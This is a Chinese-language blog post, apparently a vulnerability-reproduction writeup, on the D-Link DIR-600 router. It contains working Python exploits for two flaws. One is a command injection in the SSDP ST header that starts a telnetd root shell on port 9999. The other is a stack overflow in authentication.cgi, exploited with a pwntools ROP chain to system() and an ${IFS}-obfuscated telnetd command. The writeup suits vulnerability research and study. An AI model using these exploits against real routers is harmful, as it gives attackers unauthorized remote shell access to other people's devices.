@@ -1,0 +1,659 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/enter-line.ico">
+  <link rel="icon" href="/img/enter-line.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="TKYmax">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="DRI-600 漏洞复现简要漏洞一 命令注入漏洞  漏洞分析cgibin注册多个函数 ， 我们定位到ssdpcgi_main函数，是一个基于SSDP 协议的服务，SSDP 协议是基于UDP协议的 SSDP 包结构 123456M-SEARCH * HTTP&#x2F;1.1 # SSDPHOST: 239.255.255.250:1900 MAN: &quot;ssdp:discover&quot; ST:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DIR-600漏洞复现">
+<meta property="og:url" content="http://example.com/2025/05/21/DIR-600%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="能打八个攻城狮">
+<meta property="og:description" content="DRI-600 漏洞复现简要漏洞一 命令注入漏洞  漏洞分析cgibin注册多个函数 ， 我们定位到ssdpcgi_main函数，是一个基于SSDP 协议的服务，SSDP 协议是基于UDP协议的 SSDP 包结构 123456M-SEARCH * HTTP&#x2F;1.1 # SSDPHOST: 239.255.255.250:1900 MAN: &quot;ssdp:discover&quot; ST:">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521165614263.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521165731826.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521165825939.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521170224602.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521170800808.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521171806569.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521172210738.png">
+<meta property="article:published_time" content="2025-05-21T08:05:21.000Z">
+<meta property="article:modified_time" content="2025-06-12T12:48:07.618Z">
+<meta property="article:author" content="TKYmax">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521165614263.png">
+  
+  
+  
+  <title>DIR-600漏洞复现 - 能打八个攻城狮</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>能打八个攻城狮</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DIR-600漏洞复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-21 16:05" pubdate>
+          2025年5月21日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          705 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          6 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">DIR-600漏洞复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="DRI-600-漏洞复现简要"><a href="#DRI-600-漏洞复现简要" class="headerlink" title="DRI-600 漏洞复现简要"></a>DRI-600 漏洞复现简要</h1><h2 id="漏洞一"><a href="#漏洞一" class="headerlink" title="漏洞一"></a>漏洞一</h2><ul>
+<li>命令注入漏洞</li>
+</ul>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>cgibin注册多个函数 ， 我们定位到ssdpcgi_main函数，是一个基于SSDP 协议的服务，SSDP 协议是基于UDP协议的</p>
+<p>SSDP 包结构</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">M-SEARCH * HTTP/<span class="hljs-number">1.1</span> <span class="hljs-meta"># SSDP</span><br><span class="hljs-symbol">HOST:</span> <span class="hljs-number">239.255</span><span class="hljs-number">.255</span><span class="hljs-number">.250</span>:<span class="hljs-number">1900</span> <br><span class="hljs-symbol">MAN:</span> <span class="hljs-string">&quot;ssdp:discover&quot;</span> <br><span class="hljs-symbol">ST:</span> upnp:rootdevice<br><span class="hljs-symbol">MX:</span> <span class="hljs-number">2</span><br><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>M-SEARCH</code> 是 SSDP 的主动搜索指令</li>
+<li><code>HOST:</code> 告诉它你是发给 SSDP 组播地址（也可用局部设备IP）</li>
+<li><code>MAN: &quot;ssdp:discover&quot;</code>：声明这是一条服务发现请求</li>
+<li><code>ST: ssdp:all</code>：声明你寻找所有类型的服务（也可以是 <code>upnp:rootdevice</code>、<code>uuid:xxx</code>）</li>
+<li><code>MX</code>：SSDP 协议中 响应延迟时间</li>
+</ul>
+<p>定位到这里，需要指定参数的都有命令注入风险</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521165614263.png" srcset="/img/loading.gif" lazyload alt="image-20250521165614204"></p>
+<p>通过格式化字符串，完成命令注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521165731826.png" srcset="/img/loading.gif" lazyload alt="image-20250521165731769"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521165825939.png" srcset="/img/loading.gif" lazyload alt="image-20250521165825883"></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">config_payload</span>(<span class="hljs-params">ip, port</span>):<br>    payload = (<br>          <span class="hljs-string">b&quot;M-SEARCH * HTTP/1.1\r\n&quot;</span><br>        + <span class="hljs-string">f&quot;HOST: <span class="hljs-subst">&#123;ip&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>\r\n&quot;</span>.encode()<br>        + <span class="hljs-string">b&quot;ST:uuid:;telnetd -l /bin/sh -p 9999\r\n&quot;</span><br>        + <span class="hljs-string">b&quot;MX: 2\r\n&quot;</span> <br>        + <span class="hljs-string">b&#x27;MAN:&quot;ssdp:discover&quot;\r\n&#x27;</span><br>        + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    )<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">ip, port</span>):<br>    <span class="hljs-keyword">try</span>:<br>        sock = socket.socket(<br>            socket.AF_INET,<br>            socket.SOCK_DGRAM,<br>            socket.IPPROTO_UDP<br>        )<br>        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="hljs-number">2</span>)<br>        payload = config_payload(ip, port)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] Targeting <span class="hljs-subst">&#123;ip&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>&quot;</span>)<br>        sock.sendto(payload, (ip, port))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Exploit packet sent successfully&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Check telnet service on port 9999&quot;</span>)<br>        <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    IP = <span class="hljs-string">&quot;192.168.0.1&quot;</span><br>    SSDP_PORT = <span class="hljs-number">1900</span><br>    send_payload(IP, SSDP_PORT)<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞二"><a href="#漏洞二" class="headerlink" title="漏洞二"></a>漏洞二</h2><ul>
+<li>栈溢出漏洞</li>
+</ul>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>定位到认证函数authenticationcgi_main，这里获取id和password并没有进行长度验证，当进行strcpy的时候，就会发生栈溢出</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521170224602.png" srcset="/img/loading.gif" lazyload alt="image-20250521170224538"></p>
+<p>利用bp测试一下</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/authentication.cgi?id=aaaaaa&amp;password=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.0.1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uid=SdRpsGe1Do<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure>
+
+<p>发现果然崩溃了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521170800808.png" srcset="/img/loading.gif" lazyload alt="image-20250521170800716"></p>
+<p>接下来就构建rop链，需要控制返回地址和参数，从这个函数结尾可以看到，恢复压栈的参数，我们既然可以控制栈，当然可以控制这些参数，所以我们需要找到一个调用system代码段</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521171806569.png" srcset="/img/loading.gif" lazyload alt="image-20250521171806518"></p>
+<p>之前的命令注入漏洞就有一个代码段比较合适</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250521172210738.png" srcset="/img/loading.gif" lazyload alt="image-20250521172210678"></p>
+<p>在构建ROP的时候有两个点需要注意</p>
+<ol>
+<li>strcpy会\x00截断，无法直接通过id来实现控制返回地址和参数</li>
+<li>password会对空格进行编码，需要绕过一下</li>
+</ol>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> requests<br><br>load_system = <span class="hljs-number">0x00413F24</span><br>sh_addr = <span class="hljs-number">0x43a190</span><br><span class="hljs-built_in">id</span> = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x81c</span> + p32(load_system)<br>password = <span class="hljs-string">b&#x27;telnetd$&#123;IFS&#125;-l$&#123;IFS&#125;/bin/sh$&#123;IFS&#125;-p$&#123;IFS&#125;8888;&#x27;</span><br>password = password.ljust(<span class="hljs-number">0x400</span> , <span class="hljs-string">b&#x27;b&#x27;</span>) + p32(sh_addr)<br><br>url = <span class="hljs-string">&quot;http://192.168.0.1/authentication.cgi&quot;</span><br>params = &#123;<br>  <span class="hljs-string">&quot;id&quot;</span> : <span class="hljs-built_in">id</span> , <br>  <span class="hljs-string">&quot;password&quot;</span> : password<br>&#125;<br>response = requests.get(url = url , params = params).text<br><span class="hljs-built_in">print</span>(response)<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="所遇问题"><a href="#所遇问题" class="headerlink" title="所遇问题"></a>所遇问题</h2><ol>
+<li>漏洞挖掘有什么通用的挖洞思路？</li>
+<li>怎么进行测试快速发现漏洞？</li>
+<li>必备的技术栈有哪些？</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/05/23/squashFS-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" title="squashFS 文件系统">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">squashFS 文件系统</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/05/%E5%8F%8D%E5%BC%B9SHELL-%E4%B8%8D%E5%9B%9E%E6%98%BE%E5%B8%A6%E5%A4%96-%E6%AD%A3%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5-%E9%98%B2%E7%81%AB%E5%A2%99%E5%87%BA%E5%85%A5%E7%AB%99-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" title="反弹SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载">
+                        <span class="hidden-mobile">反弹SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <span>P0ach1l</span></a> <i class="iconfont icon-love"></i> <span>GX</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
